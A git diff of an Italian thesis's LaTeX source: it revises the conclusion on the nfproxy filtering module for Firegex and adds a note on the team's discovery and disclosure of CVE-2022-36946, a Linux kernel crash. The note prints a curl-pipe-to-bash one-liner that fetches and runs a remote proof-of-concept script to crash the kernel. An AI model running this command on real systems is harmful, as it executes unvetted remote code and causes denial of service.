@@ -1,12 +1,37 @@
 \chapter*{Conclusioni}\label{chap:ending}
 \addcontentsline{toc}{chapter}{Conclusioni}
 
-In questo lavoro di tesi si è concluso con successo la progettazione e lo sviluppo del modulo \texttt{\gls{nfproxy}} per Firegex, che permette rispetto ai moduli già esistenti di filtrare con un'elevata flessibilità e accuratezza il traffico, tramite l'implementazione di filtri in linguaggio Python.
+In questo lavoro di tesi si è concluso con successo la progettazione e lo sviluppo del modulo \gls{nfproxy} per Firegex, che permette rispetto ai moduli già esistenti di filtrare con un'elevata flessibilità e accuratezza il traffico, tramite l'implementazione di filtri in linguaggio Python.
 
-Nonostante il calo di performance, notoriamente previsto rispetto al modulo \texttt{\gls{nfregex}}, \texttt{\gls{nfproxy}} si è dimostrato più che sufficientemente performante per poter essere utilizzato in una competizione Attack-Defense. Questo è stato possibile grazie agli sforzi eseguiti nella progettazione e nell'implementazione dell'architettura, che ha permesso di ottenere ottimi risultati, portandolo a diventare un ottimo strumento per la difesa dei servizi.
+Nonostante il calo di performance, notoriamente previsto rispetto al modulo \gls{nfregex}, \gls{nfproxy} si è dimostrato più che sufficientemente performante per poter essere utilizzato in una competizione Attack-Defense. Questo è stato possibile grazie agli sforzi eseguiti nella progettazione e nell'implementazione dell'architettura, che ha permesso di ottenere ottimi risultati, portandolo a diventare un ottimo strumento per la difesa dei servizi.
 
 Il lavoro fatto per questa tesi può essere inoltre un ottimo punto di partenza per eseguire ulteriori potenziamenti al modulo stesso, ma anche per l'implementazione di alternative che fanno uso dello stesso modello architetturale qui presentato.
 
-Inoltre, l'integrazione di nuove funzionalità, come quelle citate nelle note degli sviluppi futuri, renderebbe \texttt{\gls{nfproxy}} un modulo ancora più versatile e flessibile di quanto non lo sia già, permettendone l'utilizzo in contesti ancora più ampi e diversificati.
+Inoltre, l'integrazione di nuove funzionalità renderebbe \gls{nfproxy} un modulo ancora più versatile e flessibile di quanto non lo sia già, permettendone l'utilizzo in contesti ancora più ampi e diversificati. Tra le possibili evoluzioni future si potrebbero considerare l'estensione del supporto a protocolli aggiuntivi come \gls{http}/2 e \gls{udp}, l'implementazione di meccanismi avanzati per la condivisione di dati tra thread mediante strutture C thread-safe, e lo sviluppo di funzionalità di monitoraggio in tempo reale delle code di Netfilter attraverso le \gls{api} kernel dedicate. Un'altra direzione promettente potrebbe essere la realizzazione di un'architettura alternativa basata su proxy \gls{mitm} tradizionali con translation trasparente di indirizzi e porte, che manterrebbe la stessa flessibilità di filtraggio ma con un approccio architetturale differente.
 
-Infine, il lavoro svolto ha dimostrato come sia possibile coniugare flessibilità e prestazioni in un contesto altamente competitivo come quello delle competizioni \gls{ctf} \gls{ad}, fornendo uno strumento che non solo risponde alle esigenze immediate, ma che può evolversi per affrontare sfide future.
+Concludendo, il lavoro svolto ha dimostrato come sia possibile coniugare flessibilità e prestazioni in un contesto altamente competitivo come quello delle competizioni \gls{ctf} \gls{ad}, fornendo uno strumento che non solo risponde alle esigenze immediate, ma che può evolversi per affrontare sfide future.
+
+\chapter*{Note: CVE-2022-36946}\label{chap:notes}
+\addcontentsline{toc}{chapter}{Note}
+
+Durante lo sviluppo di \texttt{\gls{nfregex}}, lavorando con un altro membro del team Pwnzer0tt1\footciteref{pwnzer0tt1}, Nicola Guerrera, è stata scoperta una vulnerabilità di sicurezza che permetteva a un utente malintenzionato di causare un crash del kernel.
+
+La vulnerabilità è stata inizialmente segnalata al team di sicurezza del kernel, che ha rapidamente rilasciato una \textit{patch}\footcite{netfilter: nf\_queue: do not allow packet truncation below transport header offset}{cve_2022_36946_patch}. Successivamente è stata segnalata al MITRE, e quindi identificata come \textbf{CVE-2022-36946}\footcite{\url{https://nvd.nist.gov/vuln/detail/cve-2022-36946}}{cve_2022_36946}.
+
+In un primo momento la problematica ci è sembrata difficilmente sfruttabile, in quanto pensavamo richiedesse necessariamente i privilegi di amministratore per essere correttamente sfruttata. Tuttavia, la vulnerabilità è stata classificata come critica (7.5 HIGH), in quanto con l'utilizzo dei Linux namespace permette il crash del kernel anche tramite utenti non privilegiati.
+È possibile verificare e sfruttare la vulnerabilità, senza privilegi, tramite il \textit{One-Command} mostrato nel Codice~\ref{lst:poc_cve}.
+
+\begin{listing}[H]
+\begin{minted}[
+    frame=single,
+    framerule=0.8pt,
+    fontsize=\footnotesize,
+    breaklines
+]{bash}
+curl -sLf https://pwnzer0tt1.it/cve-2022-36946.sh | bash
+\end{minted}
+\vspace{-1em}
+\caption{One-Command tramite cui eseguire la \gls{poc} della CVE-2022-36946.}\label{lst:poc_cve}
+\end{listing}
+
+Informazioni aggiuntive e il sorgente completo della \gls{poc} sono disponibili sulla pagina \url{https://github.com/Pwnzer0tt1/CVE-2022-36946}.
